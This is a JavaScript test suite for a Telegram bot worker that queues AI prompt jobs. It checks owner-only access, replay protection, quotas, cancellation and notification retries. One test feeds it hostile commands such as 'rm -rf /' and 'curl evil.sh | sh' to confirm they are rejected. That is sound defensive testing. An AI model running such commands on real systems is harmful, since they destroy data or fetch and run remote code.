import test from 'node:test';
import assert from 'node:assert/strict';
import { handle } from '../src/worker.js';
import worker from '../src/worker.js';
import * as jobs from '../src/jobs.js';
import { parseCommand, notifyFinished } from '../src/telegram.js';
import { makeEnv, count, WEBHOOK_SECRET, OWNER_ID } from './helpers.mjs';

let nextId = 5000;
const say = async (env, text, { updateId = nextId++, from = Number(OWNER_ID), chat = { id: Number(OWNER_ID), type: 'private' } } = {}) => {
  const r = await handle(
    new Request('https://agent.test/telegram/webhook', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-telegram-bot-api-secret-token': WEBHOOK_SECRET },
      body: JSON.stringify({ update_id: updateId, message: { message_id: 1, text, from: { id: from }, chat } }),
    }),
    env,
  );
  return { status: r.status, body: await r.json() };
};
const finish = async (env, id, status = 'succeeded', text = 'all done') => {
  await jobs.claimNext(env.DB, 10, 1000);
  if (status === 'succeeded') await jobs.completeJob(env.DB, id, text, 20);
  else env.DB.raw.prepare("UPDATE jobs SET status='failed', error_code='ai_error', attempts=3 WHERE id=?").run(id);
};

test('parseCommand handles @bot suffix, case and args', () => {
  assert.deepEqual(parseCommand('/Jobs@MyBot'), { name: 'jobs', args: '' });
  assert.deepEqual(parseCommand('/new  write  a poem'), { name: 'new', args: 'write a poem' });
  assert.equal(parseCommand('hello'), null);
  assert.equal(parseCommand(undefined), null);
});

test('replies are returned inside the webhook response, addressed to the owner chat', async () => {
  const env = makeEnv();
  const { status, body } = await say(env, '/help');
  assert.equal(status, 200);
  assert.equal(body.method, 'sendMessage');
  assert.equal(body.chat_id, Number(OWNER_ID));
  assert.match(body.text, /\/new/);
});

test('/new creates an ai_prompt job from telegram', async () => {
  const env = makeEnv();
  const { body } = await say(env, '/new Summarise my notes');
  assert.match(body.text, /^Created [0-9a-f]{8} \(pending\)/);
  const row = env.DB.raw.prepare('SELECT * FROM jobs').get();
  assert.equal(row.type, 'ai_prompt');
  assert.equal(row.source, 'telegram');
  assert.equal(JSON.parse(row.payload).prompt, 'Summarise my notes');
});

test('a replayed update never creates a second job', async () => {
  const env = makeEnv();
  await say(env, '/new once only', { updateId: 777 });
  const again = await say(env, '/new once only', { updateId: 777 });
  assert.equal(again.body.duplicate, true);
  assert.equal(count(env, 'jobs'), 1);
  // even if the event row were lost, the idempotency key still prevents a second job
  env.DB.raw.prepare('DELETE FROM events').run();
  const third = await say(env, '/new once only', { updateId: 777 });
  assert.match(third.body.text, /^Already created/);
  assert.equal(count(env, 'jobs'), 1);
});

test('/new validates input, plain text and unknown commands create nothing', async () => {
  const env = makeEnv();
  assert.match((await say(env, '/new')).body.text, /Usage/);
  assert.match((await say(env, '/new ' + 'x'.repeat(2001))).body.text, /Usage/);
  assert.match((await say(env, 'please delete everything')).body.text, /Send a command/);
  for (const cmd of ['/exec rm -rf /', '/shell ls', '/run curl evil.sh | sh']) {
    assert.match((await say(env, cmd)).body.text, /Unknown command/);
  }
  assert.equal(count(env, 'jobs'), 0);
});

test('/new stops at 20 unfinished jobs (quota protection)', async () => {
  const env = makeEnv();
  for (let i = 0; i < 20; i++) await say(env, `/new job ${i}`);
  assert.equal(count(env, 'jobs'), 20);
  assert.match((await say(env, '/new one too many')).body.text, /Too many unfinished/);
  assert.equal(count(env, 'jobs'), 20);
});

test('/jobs, /failed and /job show state; results are shown only to the owner', async () => {
  const env = makeEnv();
  assert.equal((await say(env, '/jobs')).body.text, 'No jobs yet.');
  const a = await jobs.createJob(env.DB, { type: 'ai_prompt', payload: { prompt: 'p1' }, key: 'key-aaaaaaaa', source: 'app' }, 1);
  const b = await jobs.createJob(env.DB, { type: 'ai_prompt', payload: { prompt: 'p2' }, key: 'key-bbbbbbbb', source: 'app' }, 2);
  await finish(env, a.job.id, 'succeeded', 'the secret result');
  await finish(env, b.job.id, 'failed');
  const list = (await say(env, '/jobs')).body.text;
  assert.match(list, new RegExp(a.job.id.slice(0, 8)));
  assert.match((await say(env, '/failed')).body.text, /ai_error/);
  const detail = (await say(env, `/job ${a.job.id.slice(0, 8)}`)).body.text;
  assert.match(detail, /the secret result/);
  assert.match((await say(env, '/job')).body.text, /Usage/);
  assert.match((await say(env, '/job zzzzzz')).body.text, /not found/);
  assert.match((await say(env, '/job ' + '0'.repeat(8))).body.text, /not found/);
});

test('strangers and groups cannot read or create anything', async () => {
  const env = makeEnv();
  const a = await jobs.createJob(env.DB, { type: 'ai_prompt', payload: { prompt: 'private' }, key: 'key-aaaaaaaa', source: 'app' }, 1);
  await finish(env, a.job.id, 'succeeded', 'private result');
  const s = await say(env, `/job ${a.job.id}`, { from: 999, chat: { id: 999, type: 'private' } });
  assert.deepEqual(s.body, { ok: true });
  const g = await say(env, '/new hi', { chat: { id: -1001, type: 'group' } });
  assert.deepEqual(g.body, { ok: true });
  assert.equal(count(env, 'jobs'), 1);
});

test('/cancel works on pending jobs, refuses finished ones, handles ambiguity', async () => {
  const env = makeEnv();
  const p = await jobs.createJob(env.DB, { type: 'note', payload: { text: 'a' }, key: 'key-aaaaaaaa', source: 'app' }, 1);
  assert.match((await say(env, `/cancel ${p.job.id}`)).body.text, /^Cancelled/);
  assert.match((await say(env, `/cancel ${p.job.id}`)).body.text, /already cancelled/);
  env.DB.raw.prepare("INSERT INTO jobs (id,type,status,payload,idempotency_key,source,created_at,updated_at) VALUES ('abcdef01-0000-0000-0000-000000000001','note','pending','{}','key-c1c1c1c1','app',1,1),('abcdef01-0000-0000-0000-000000000002','note','pending','{}','key-c2c2c2c2','app',2,2)").run();
  assert.match((await say(env, '/cancel abcdef01')).body.text, /several jobs/);
  assert.match((await say(env, '/cancel abcdef01-0000-0000-0000-000000000002')).body.text, /^Cancelled/);
});

test('LIKE wildcards in the id argument are not honoured', async () => {
  const env = makeEnv();
  await jobs.createJob(env.DB, { type: 'note', payload: { text: 'a' }, key: 'key-aaaaaaaa', source: 'app' }, 1);
  assert.match((await say(env, '/job %%%%%%')).body.text, /not found/);
  assert.match((await say(env, '/job ______')).body.text, /not found/);
});

test('a storage error during a command is a 500 and the event is released so the retry runs', async () => {
  const quiet = console.error;
  console.error = () => {};
  try {
    const env = makeEnv();
    const real = env.DB.prepare.bind(env.DB);
    let breakJobs = true;
    env.DB.prepare = (sql) => (breakJobs && /FROM jobs/.test(sql) ? (() => { throw new Error('db down'); })() : real(sql));
    const call = () =>
      worker.fetch(
        new Request('https://agent.test/telegram/webhook', {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'x-telegram-bot-api-secret-token': WEBHOOK_SECRET },
          body: JSON.stringify({ update_id: 31337, message: { text: '/jobs', from: { id: Number(OWNER_ID) }, chat: { id: Number(OWNER_ID), type: 'private' } } }),
        }),
        env,
      );
    assert.equal((await call()).status, 500);
    assert.equal(count(env, 'events'), 0);
    breakJobs = false;
    const retry = await call();
    assert.equal(retry.status, 200);
    assert.equal((await retry.json()).method, 'sendMessage');
  } finally {
    console.error = quiet;
  }
});

// ---- completion notifications ----
const TOKEN = 'T0KEN_1234567890_abcdefghij';
const notifyEnv = (extra = {}) => makeEnv({ TELEGRAM_BOT_TOKEN: TOKEN, ...extra });
const tgJob = async (env, key = 'tg-upd-12345') => {
  const { job } = await jobs.createJob(env.DB, { type: 'ai_prompt', payload: { prompt: 'q' }, key, source: 'telegram' }, 1);
  return job;
};
const recorder = (status = 200) => {
  const calls = [];
  return { calls, fn: async (url, init) => { calls.push({ url, init }); return { ok: status >= 200 && status < 300, status }; } };
};

test('notifies the owner once when a telegram job succeeds', async () => {
  const env = notifyEnv();
  const job = await tgJob(env);
  const rec = recorder();
  assert.equal((await notifyFinished(env, 100, { fetchImpl: rec.fn })).sent, 0); // still pending: nothing to say
  await finish(env, job.id, 'succeeded', 'the answer');
  assert.equal((await notifyFinished(env, 100, { fetchImpl: rec.fn })).sent, 1);
  assert.equal(rec.calls.length, 1);
  assert.match(rec.calls[0].url, /^https:\/\/api\.telegram\.org\/bot.+\/sendMessage$/);
  const sent = JSON.parse(rec.calls[0].init.body);
  assert.equal(sent.chat_id, Number(OWNER_ID));
  assert.match(sent.text, /Job finished/);
  assert.match(sent.text, /the answer/);
  assert.equal((await notifyFinished(env, 200, { fetchImpl: rec.fn })).sent, 0); // never twice
  assert.equal(rec.calls.length, 1);
});

test('failed jobs are reported with their error code', async () => {
  const env = notifyEnv();
  const job = await tgJob(env);
  await finish(env, job.id, 'failed');
  const rec = recorder();
  await notifyFinished(env, 100, { fetchImpl: rec.fn });
  assert.match(JSON.parse(rec.calls[0].init.body).text, /Job failed[\s\S]*ai_error/);
});

test('jobs created from the app are not echoed to Telegram', async () => {
  const env = notifyEnv();
  const { job } = await jobs.createJob(env.DB, { type: 'ai_prompt', payload: { prompt: 'q' }, key: 'key-app-00001', source: 'app' }, 1);
  await finish(env, job.id);
  const rec = recorder();
  await notifyFinished(env, 100, { fetchImpl: rec.fn });
  assert.equal(rec.calls.length, 0);
});

test('notification retries are bounded to 3 and a 429 stops the run', async () => {
  const env = notifyEnv();
  const job = await tgJob(env);
  await finish(env, job.id);
  const bad = recorder(500);
  for (let i = 0; i < 6; i++) await notifyFinished(env, 100 + i, { fetchImpl: bad.fn });
  assert.equal(bad.calls.length, 3);

  const env2 = notifyEnv();
  const a = await tgJob(env2, 'tg-upd-1111111');
  const b = await tgJob(env2, 'tg-upd-2222222');
  await finish(env2, a.id);
  await finish(env2, b.id);
  const limited = recorder(429);
  await notifyFinished(env2, 100, { fetchImpl: limited.fn });
  assert.equal(limited.calls.length, 1);
});

test('network errors are survived and the token never reaches the logs', async () => {
  const env = notifyEnv();
  const job = await tgJob(env);
  await finish(env, job.id);
  const logged = [];
  const quiet = console.error;
  console.error = (...a) => logged.push(a.join(' '));
  try {
    const out = await notifyFinished(env, 100, { fetchImpl: async () => { throw new Error(`fetch failed for https://api.telegram.org/bot${TOKEN}/sendMessage`); } });
    assert.equal(out.sent, 0);
  } finally {
    console.error = quiet;
  }
  assert.ok(!logged.join('\n').includes(TOKEN));
});

test('no notifications without the switch, the bot token or an owner id', async () => {
  for (const extra of [{ TELEGRAM_ENABLED: 'false' }, { TELEGRAM_BOT_TOKEN: undefined }, { OWNER_TELEGRAM_ID: undefined }]) {
    const env = notifyEnv(extra);
    const job = await tgJob(env);
    await finish(env, job.id);
    const rec = recorder();
    assert.equal((await notifyFinished(env, 100, { fetchImpl: rec.fn })).sent, 0);
    assert.equal(rec.calls.length, 0);
  }
});

test('notifications go out in batches of at most 5 per run', async () => {
  const env = notifyEnv();
  for (let i = 0; i < 7; i++) {
    const job = await tgJob(env, `tg-upd-90000${i}`);
    await finish(env, job.id);
  }
  const rec = recorder();
  assert.equal((await notifyFinished(env, 100, { fetchImpl: rec.fn })).sent, 5);
  assert.equal((await notifyFinished(env, 200, { fetchImpl: rec.fn })).sent, 2);
});
